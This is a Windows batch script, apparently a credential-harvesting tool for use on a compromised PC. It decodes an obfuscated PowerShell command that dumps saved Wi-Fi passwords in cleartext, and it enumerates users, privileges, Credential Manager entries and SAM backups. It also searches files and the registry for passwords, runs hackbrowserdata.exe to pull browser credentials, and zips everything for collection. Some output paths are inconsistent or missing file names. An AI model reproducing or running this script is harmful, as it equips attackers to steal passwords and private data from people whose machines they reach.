@echo off
mkdir %USERPROFILE%\Results4HackedPC
mkdir %USERPROFILE%\Results4HackedPC\WifiPasswords
cd WifiPasswords
powershell -EncodedCommand "KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUAcwApACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAcIFwAOgAoAC4AKwApACQAHSAgAHwAIAAlAHsAJABuAGEAbQBlAD0AJABfAC4ATQBhAHQAYwBoAGUAcwAuAEcAcgBvAHUAcABzAFsAMQBdAC4AVgBhAGwAdQBlAC4AVAByAGkAbQAoACkAOwAgACQAXwB9ACAAfAAgACUAewAoAG4AZQB0AHMAaAAgAHcAbABhAG4AIABzAGgAbwB3ACAAcAByAG8AZgBpAGwAZQAgAG4AYQBtAGUAPQAdICQAbgBhAG0AZQAdICAAawBlAHkAPQBjAGwAZQBhAHIAKQB9ACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAcIEsAZQB5ACAAQwBvAG4AdABlAG4AdABcAFcAKwBcADoAKAAuACsAKQAkAB0gIAB8ACAAJQB7ACQAcABhAHMAcwA9ACQAXwAuAE0AYQB0AGMAaABlAHMALgBHAHIAbwB1AHAAcwBbADEAXQAuAFYAYQBsAHUAZQAuAFQAcgBpAG0AKAApADsAIAAkAF8AfQAgAHwAIAAlAHsAWwBQAFMAQwB1AHMAdABvAG0ATwBiAGoAZQBjAHQAXQBAAHsAIABQAFIATwBGAEkATABFAF8ATgBBAE0ARQA9ACQAbgBhAG0AZQA7AFAAQQBTAFMAVwBPAFIARAA9ACQAcABhAHMAcwAgAH0AfQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAFcAaQBmAGkAUABhAHMAcwB3AG8AcgBkAC4AdAB4AHQA"

mkdir %USERPROFILE%\Results4HackedPC\WindowsPrograms

powershell -c "Start-Process 'systeminfo' -NoNewWindow -Wait" > %USERPROFILE%\WindowsPrograms\Basic-System-Information.txt
powershell -c "Get-ChildItem Env: | ft Key,Value" > %USERPROFILE%\WindowsPrograms\Environment-Variables.txt
powershell -c "Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address" > %USERPROFILE%\WindowsPrograms\Network-Information.txt
powershell -c "Get-DnsClientServerAddress -AddressFamily IPv4 | ft"  > %USERPROFILE%\WindowsPrograms\DNS-Servers.txt
powershell -c "Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State"  > %USERPROFILE%\WindowsPrograms\ARP-cache.txt
powershell -c "Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex"  > %USERPROFILE%\WindowsPrograms\Routing-Table.txt
powershell -c "Start-Process 'netstat' -ArgumentList '-ano' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Network-Connections.txt
powershell -c "Get-PSDrive | where {$_.Provider -like 'Microsoft.PowerShell.Core\FileSystem'}| ft"  > %USERPROFILE%\WindowsPrograms\Connected-Drives.txt
powershell -c "Start-Process 'netsh' -ArgumentList 'firewall show config' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Firewall-Config.txt
powershell -c "Write-Host $env:UserDomain\$env:UserName"  > %USERPROFILE%\WindowsPrograms\Current-User.txt
powershell -c "start-process 'whoami' -ArgumentList '/priv' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\User-Privileges.txt
powershell -c "Get-LocalUser | ft Name,Enabled,LastLogon"  > %USERPROFILE%\WindowsPrograms\Local-Users.txt
powershell -c "Start-Process 'qwinsta' -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Logged-in-Users.txt
powershell -c "start-process 'cmdkey' -ArgumentList "/list" -NoNewWindow -Wait | ft"  > %USERPROFILE%\WindowsPrograms\Credential-Manager.txt
powershell -c "Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select 'Default*' | ft"  > %USERPROFILE%\WindowsPrograms\User-Autologon-Registry-Items.txt
powershell -c "Get-LocalGroup | ft Name"  > %USERPROFILE%\WindowsPrograms\Local-Groups.txt
powershell -c "Get-LocalGroupMember Administrators | ft Name, PrincipalSource"  > %USERPROFILE%\WindowsPrograms\Local-Administrators.txt
powershell -c "Get-ChildItem C:\Users | ft Name"  > %USERPROFILE%\WindowsPrograms\User-Directories.txt
powershell -c "Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM"  > %USERPROFILE%\WindowsPrograms\Searching-for-SAM-backup-files.txt
powershell -c "gwmi -Query 'Select * from Win32_Process' | where {$_.Name -notlike 'svchost*'} | Select Name, Handle, @{Label='Owner';Expression={$_.GetOwner().User}} | ft -AutoSize"  > %USERPROFILE%\WindowsPrograms\Running-Processes.txt
powershell -c "Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"  > %USERPROFILE%\WindowsPrograms\Installed-Software-Directories.txt
powershell -c "Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name"  > %USERPROFILE%\WindowsPrograms\Software-in-Registry.txt
powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} | ft"  > %USERPROFILE%\WindowsPrograms\Folders-with-Everyone-Permissions.txt
powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} | ft" > %USERPROFILE%\WindowsPrograms\Folders-with-BUILTIN-User-Permissions.txt
powershell -c "Test-Path -Path 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer' | ft" > %USERPROFILE%\WindowsPrograms\Checking-registry-for-AlwaysInstallElevated.txt
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State" > %USERPROFILE%\WindowsPrograms\Scheduled-Tasks.txt
powershell -c "Get-ChildItem C:\Windows\Tasks | ft" > %USERPROFILE%\WindowsPrograms\
powershell -c "Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl"  > %USERPROFILE%\WindowsPrograms\
powershell -c "Get-ChildItem c:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike '*C:\temp*' -and $_.PSParentPath -notlike '*Reference Assemblies*' -and $_.PSParentPath -notlike '*Windows Kits*'}| Select-String -Pattern 'password'" > %USERPROFILE%\WindowsPrograms\Searching-for-files-with-passwords.txt
powershell -c "reg query HKLM /f password /t REG_SZ /s"  > %USERPROFILE%\WindowsPrograms\Searching-HKLM-for-passwords.txt
powershell -c "reg query HKCU /f password /t REG_SZ /s"  > %USERPROFILE%\WindowsPrograms\Searching-HKCU-for-passwords.txt


%~dp0hackbrowserdata.exe -b chrome -f json --results-dir %USERPROFILE%\Chrome
%~dp0hackbrowserdata.exe -b edge -f json --results-dir Microsoft-Edge
%~dp0hackbrowserdata.exe -b firefox -f json --results-dir FireFox
%~dp0hackbrowserdata.exe -b opera -f json --results-dir Opera
cd %USERPROFILE%
powershell -c "Compress-Archive Results4HackedPC Results4HackedPC.zip"
@echo off
pause
